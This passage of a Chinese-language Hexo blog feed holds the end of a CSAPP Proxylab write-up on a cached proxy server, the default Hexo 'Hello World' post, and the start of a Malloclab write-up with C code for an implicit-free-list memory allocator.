class="comment">/**</span></span><br><span class="line"><span class="comment"> * get data from cache in terms of key</span></span><br><span class="line"><span class="comment"> * @param cp</span></span><br><span class="line"><span class="comment"> * @param key</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> *         NULL not found</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">cache_item *<span class="title">cache_get</span><span class="params">(cache *cp, <span class="keyword">char</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cache_item *ci = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* read start*/</span></span><br><span class="line">    P(&amp;w_mutex);</span><br><span class="line">    P(&amp;rcounter_mutex);</span><br><span class="line">    rcounter++;</span><br><span class="line">    <span class="keyword">if</span> (rcounter == <span class="number">1</span>)</span><br><span class="line">        P(&amp;res_mutex);</span><br><span class="line">    V(&amp;rcounter_mutex);</span><br><span class="line">    V(&amp;w_mutex);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; cp-&gt;ci_num; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cp-&gt;ci[i].effect_size != <span class="number">0</span> &amp;&amp;</span><br><span class="line">            !<span class="built_in">strcmp</span>(cp-&gt;ci[i].key, key)) &#123;</span><br><span class="line">            ci = &amp;cp-&gt;ci[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    P(&amp;rcounter_mutex);</span><br><span class="line">    rcounter--;</span><br><span class="line">    <span class="keyword">if</span> (rcounter == <span class="number">0</span>)</span><br><span class="line">        V(&amp;res_mutex);</span><br><span class="line">    V(&amp;rcounter_mutex);</span><br><span class="line">    <span class="keyword">return</span> ci;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-cache实现的额外想法"><a href="#4-cache实现的额外想法" class="headerlink" title="4. cache实现的额外想法"></a>4. cache实现的额外想法</h3><p>其实cache最开始我是准备用Log-Strucutre的实现，但是发现实现起来很复杂，而且csapp的测试跑不了太久，Log-Sturcutre的优点没法充分利用。下面简单说一下思路。Log-Strucutre的特点就是Only-Append. 题目的要求是缓存从server返回的数据，而这些数据的大小不一，如果按照上文的实现，<strong>必然会导致很多内部碎片</strong>。而采用only-append的思想，则不存在内部碎片的问题，如下图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200906101718082.png" alt="image-20200906101718082"></p><p>但是这样又会存在一个新问题，那就是cache空间是有限的，我们最后总会evict掉某些块，<strong>那就很容产生外部碎片问题，</strong>这该怎么解决呢？开启一个compact线程就好了，compact线程可以周期性的对整个内存空间做压缩处理，去掉外部碎片问题。compact的触发点可以有两个：</p><ol><li>周期性触发</li><li>当前cache已满</li></ol><p>但是每次compact可能也会成为cache的读写性能瓶颈。 所以现在又该怎么办？</p><p>可以考虑<strong>“分页思想”，</strong>操作系统里面最经典的知识之一，要想提高系统的内存利用率，降低外部碎片和内部碎片，那就将内存分页，将每个取回的file进行分页,然后插入到“虚拟内存页”，不过这样需要维护页表了。实现难度较大，所以我也没做了，实在没时间继续耗在csapp上，不过还是想将这个思路写在这里，说不定未来我就回来写了呢。</p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>这个实验涉及的知识较多，网络编程（c语言的socket一言难尽啊，特别写过python和java后。。。），多线程并发，同步信号量，cache替换策略，每一个都是重要的知识点。所以也还是挺有收获的。</p><p>当然了，这也是csapp的最后一个lab，也就意味着我的csapp之旅告一段落了，但是csapp这本书是真的值得每个程序员多看几遍的，里面的每个知识点都相当重要。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本次lab Proxylab。 也是csapp的最后一个lab。&lt;/p&gt;
&lt;h2 id=&quot;1-实验目的&quot;&gt;&lt;a href=&quot;#1-实验目的&quot; class=&quot;headerlink&quot; title=&quot;1.实验目的&quot;&gt;&lt;/a&gt;1.实验目的&lt;/h2&gt;&lt;p&gt;proxylab, 从最终目的来看，我们实现的是一个代理服务器。proxy接收来client的请求，转发给server，并从server中取得数据后，返回给client。另外，proxy从server中取回数据后还需要做cache，这样，当另一个client请求相同的数据时，就不用从server端请求数据，降低了server的压力。&lt;/p&gt;
&lt;p&gt;再看看一些细节的要求，要求支持多线程请求，多线程涉及一些同步的问题，所以做的时候一定要考虑哪些是互斥资源，用什么方式同步等。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Csapp" scheme="https://www.ravenxrz.ink/categories/Csapp/"/>
    
    
      <category term="proxylab" scheme="https://www.ravenxrz.ink/tags/proxylab/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://www.ravenxrz.ink/archives/undefined.html"/>
    <id>https://www.ravenxrz.ink/archives/undefined.html</id>
    <published>2020-09-06T03:31:09.751Z</published>
    <updated>2020-09-06T03:31:09.751Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvLw==" title="https://hexo.io/">Hexo<i class="fa fa-external-link"></i></span>! This is your very first post. Check <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv" title="https://hexo.io/docs/">documentation<i class="fa fa-external-link"></i></span> for more info. If you get any problems when using Hexo, you can find the answer in <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=" title="https://hexo.io/docs/troubleshooting.html">troubleshooting<i class="fa fa-external-link"></i></span> or you can ask me on <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==" title="https://github.com/hexojs/hexo/issues">GitHub<i class="fa fa-external-link"></i></span>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s" title="https://hexo.io/docs/writing.html">Writing<i class="fa fa-external-link"></i></span></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=" title="https://hexo.io/docs/server.html">Server<i class="fa fa-external-link"></i></span></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s" title="https://hexo.io/docs/generating.html">Generating<i class="fa fa-external-link"></i></span></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s" title="https://hexo.io/docs/one-command-deployment.html">Deployment<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly9oZXhvLmlvLw==&quot; title=&quot;https://hexo.io/&quot;&gt;Hexo&lt;i class=&quot;fa fa-external-link&quot;&gt;&lt;/i&gt;&lt;/spa
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Csapp-Malloclab题解</title>
    <link href="https://www.ravenxrz.ink/archives/36920455.html"/>
    <id>https://www.ravenxrz.ink/archives/36920455.html</id>
    <published>2020-08-26T08:45:31.000Z</published>
    <updated>2020-09-06T07:37:36.750Z</updated>
    
    <content type="html"><![CDATA[<p>本次lab，malloclab，自己手写一个内存分配器。</p><a id="more"></a><h2 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1. 实验目的"></a>1. 实验目的</h2><p>malloclab，简单明了的说就是实现一个自己的 malloc,free,realloc函数。做完这个实验你能够加深对指针的理解，掌握一些内存分配中的核心概念，如：如何组织heap，如何找到可用free block，采用first-fit, next-fit,best-fit?  如何在吞吐量和内存利用率之间做trade-off等。</p><p>就我个人的感受来说，malloclab的基础知识不算难，但是代码中充斥了大量的指针运算，为了避免硬编码指针运算，会定义一些宏，而定义宏来操作则会加大debug的难度（当然了，诸如linus这样的大神会觉得，代码写好了，为什么还用debug？），debug基本只能靠gdb和print，所以整体还是有难度了。</p><h2 id="2-背景知识"><a href="#2-背景知识" class="headerlink" title="2. 背景知识"></a>2. 背景知识</h2><p>这里简单说一下要做这个实验需要哪些背景知识。</p><p>首先，为了写一个alloctor,需要解决哪些问题。csapp本章的ppt中列出了一些关键问题：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/clip_image001.png" alt="Implementation Issues  How do we know how much memory to free given just a  pointer?  How do we keep track of the free blocks?  What do we do with the extra space when allocating a  structure that is smaller than the free block it is placed in?  How do we pick a block to use for allocation — many  might fit?  How do we reinsert freed block? "></p><p>第一个问题，free(ptr)这样的routine是如何知道本次释放的block的大小的？</p><p>很显然我们需要一些额外的信息来存放block的元信息。之类的具体做法是在block的前面添加一个word，存放分配的size和是否已分配状态。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826170802474.png" alt="image-20200826170802474"></p><p><strong>注意：这里只是给出了最简单的情况，实际操作中，额外的元数据不仅只有这些</strong></p><p>第二个问题，如何追踪free blocks?</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826170901374.png" alt="image-20200826170901374"></p><p>csapp一共给出了4种方案。其中implicit list在书上给出了源码，我个人实现了implicit list和explicit list。segregated free list感觉利用OO思想，把explicit list封装一下也是能够实现的，红黑树同理。</p><p>第三个问题，拆分策略（详见代码的place函数）</p><p>第四个问题，一般来说有 first-fit, next-fit和best-fit策略，我这里采用了最简单的first-fit策略。（这其实是一个trade-off的问题，看你是想要吞吐量高还是内存利用率高了）</p><p>ok，下面就来看看implicit list(书上有）和explicit list两种方案是如何实现的。</p><h2 id="3-Implicit-list"><a href="#3-Implicit-list" class="headerlink" title="3. Implicit list"></a>3. Implicit list</h2><p>下面是一个implicit list的组织方式和一个block的具体情况，一个block采用了双边tag，保证可以前向和后向索引。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826171525409.png" alt="image-20200826171525409"></p><p>这种方案的优点：实现简单。缺点：寻找free block的开销过大。</p><p>现在说说lab中给的一些代码把：</p><ol><li>memlib，这个文件中，给出了heap扩展的方法，除此之外，我们还可以获取当前可用heap的第一个字节，最后一个字节，heap size等。具体实现是通过一个sbrk指针来操作的。</li><li>mdriver, 这个文件不用看，只用它编译出来的可执行文件即可，用于测试我们写的allocator是否正确。</li><li>mm.c， 这个就是我们要操作的文件了，主要实现三个函数 mm_malloc,mm_free,mm_realloc，我们再额外定义自己需要的函数。</li></ol><p>好的，下面再说说具体代码，因为代码中涉及到很多指针操作，我们对这些操作做一个峰装，用宏定义来操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WSIZE       4       <span class="comment">/* Word and header/footer size (bytes) */</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DSIZE       8       <span class="comment">/* Double word size (bytes) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNKSIZE  (1&lt;&lt;12)  <span class="comment">/* Extend heap by this amount (bytes) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX(x, y) ((x) &gt; (y)? (x) : (y))  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Pack a size and allocated bit into a word */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACK(size, alloc)  ((size) | (alloc)) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read and write a word at address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET(p)       (*(unsigned int *)(p))           </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT(p, val)  (*(unsigned int *)(p) = (val))   </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read the size and allocated fields from address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_SIZE(p)  (GET(p) &amp; ~0x7)                   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)                    </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of its header and footer */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HDRP(bp)       ((char *)(bp) - WSIZE)                     </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FTRP(bp)       ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of next and previous blocks */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_BLKP(bp)  ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_BLKP(bp)  ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE))) </span></span><br></pre></td></tr></table></figure><p>注释给出了每个宏的意义。</p><p>一些额外的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *free_list_head = <span class="literal">NULL</span>; <span class="comment">// 整个list的头部</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span>;<span class="comment">// heap 不够分配时，用于扩展heap大小</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span>;<span class="comment">// free block时，可能存在一些前后也是free block的情况，这时需要做合并，不允许一条list上，同时存在两个连续的free block</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>;<span class="comment">// 在list上找到可满足本次malloc请求的block</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> size)</span></span>; <span class="comment">// 放置当前块，如果size &lt; 本次block size - MIN_BLOCK ，则需要做split操作</span></span><br></pre></td></tr></table></figure><h3 id="mm-init"><a href="#mm-init" class="headerlink" title="mm_init"></a>mm_init</h3><p>这个函数对mm做初始化，工作包括：</p><ol><li>分配4个字，第0个字为pad，为了后续分配的块payload首地址能够是8字节对齐。</li><li>第1-2个字为序言块，free_list_head指向这里，相当于给list一个定义，不然我们从哪里开始search呢？</li><li>第3个字，结尾块，主要用于确定尾边界。</li><li>extend_heap, 分配一大块heap，用于后续malloc请求时分配。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_init - initialize the malloc package.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">// Create the inital empty heap</span></span><br><span class="line">    <span class="keyword">if</span>( (free_list_head = mem_sbrk(<span class="number">4</span> * WSIZE)) == (<span class="keyword">void</span> *)<span class="number">-1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PUT(free_list_head, <span class="number">0</span>);</span><br><span class="line">    PUT(free_list_head + (<span class="number">1</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>));</span><br><span class="line">    PUT(free_list_head + (<span class="number">2</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>));</span><br><span class="line">    PUT(free_list_head + (<span class="number">3</span> * WSIZE), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">    free_list_head += (<span class="number">2</span> * WSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Extend the empty heap with a free block of CHUNKSIZE bytes</span></span><br><span class="line">    <span class="keyword">if</span>(extend_heap(CHUNKSIZE/WSIZE) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="extend-heap"><a href="#extend-heap" class="headerlink" title="extend_heap"></a>extend_heap</h3><p>工作：</p><ol><li>size更新，保证size为偶数个word</li><li>为当前分配的block添加元数据，即header和footer信息</li><li>更新尾边界</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate an even number of words to maintain alignment */</span></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * WSIZE : words * WSIZE;</span><br><span class="line">    <span class="keyword">if</span>( (<span class="keyword">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化free block的header/footer和epilogue header</span></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Coalesce if the previous block was free</span></span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mm-malloc"><a href="#mm-malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h3><p>mm_malloc也比较简单，首先更改请求size，满足8字节对齐+元数据的开销要求。接着尝试找到当前可用heap中是否有能够满足本次请求的block，有则直接place，无则需要扩展当前可用heap的大小，扩展后再place。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_malloc - Allocate a block by incrementing the brk pointer.</span></span><br><span class="line"><span class="comment"> *     Always allocate a block whose size is a multiple of the alignment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> asize;      <span class="comment">// Adjusted block size</span></span><br><span class="line">    <span class="keyword">size_t</span> extendsize; <span class="comment">// Amount to extend heap if no fit</span></span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Ajust block size to include overhea and alignment reqs;</span></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= DSIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        asize = <span class="number">2</span> * DSIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        asize = DSIZE * ((size + (DSIZE) + (DSIZE - <span class="number">1</span>)) / DSIZE); <span class="comment">// 超过8字节，加上header/footer块开销，向上取整保证是8的倍数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Search the free list for a fit</span></span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        place(bp, asize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// No fit found. Get more memory and place the block</span></span><br><span class="line">        extendsize = MAX(asize, CHUNKSIZE);</span><br><span class="line">        <span class="keyword">if</span> ((bp = extend_heap(extendsize / WSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        place(bp, asize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc\n&quot;</span>);</span><br><span class="line">    print_allocated_info();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="find-fit"><a href="#find-fit" class="headerlink" title="find_fit"></a>find_fit</h3><p>遍历整个list，找到还未分配且满足当前请求大小的block，然后返回该block的首地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 使用first-fit policy</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> * @return void* 成功，返回可用块的首地址</span></span><br><span class="line"><span class="comment"> *               失败，返回NULL</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *bp ;      </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (bp = NEXT_BLKP(free_list_head); GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(GET_ALLOC(HDRP(bp)) == <span class="number">0</span> &amp;&amp; size &lt;= GET_SIZE(HDRP(bp)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="place"><a href="#place" class="headerlink" title="place"></a>place</h3><p>place的工作也很简单：</p><ol><li>最小块大小（2*DSIZE) &lt;= 当前块的大小-当前请求的块大小 ，则对当前block做split</li><li>否则，直接place即可。</li></ol><p>现在继续看看free：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief place block</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> remain_size;</span><br><span class="line">    <span class="keyword">size_t</span> origin_size;</span><br><span class="line"></span><br><span class="line">    origin_size = GET_SIZE(HDRP(bp));</span><br><span class="line">    remain_size = origin_size - size;</span><br><span class="line">    <span class="keyword">if</span>(remain_size &gt;= <span class="number">2</span>*DSIZE)  <span class="comment">// 剩下的块，最少需要一个double word (header/footer占用一个double word, pyaload不为空，再加上对齐要求)</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">1</span>));</span><br><span class="line">        PUT(HDRP(NEXT_BLKP(bp)), PACK(remain_size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(bp)), PACK(remain_size, <span class="number">0</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 不足一个双字，保留内部碎片</span></span><br><span class="line">        PUT(HDRP(bp), PACK(origin_size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(origin_size, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mm-free"><a href="#mm-free" 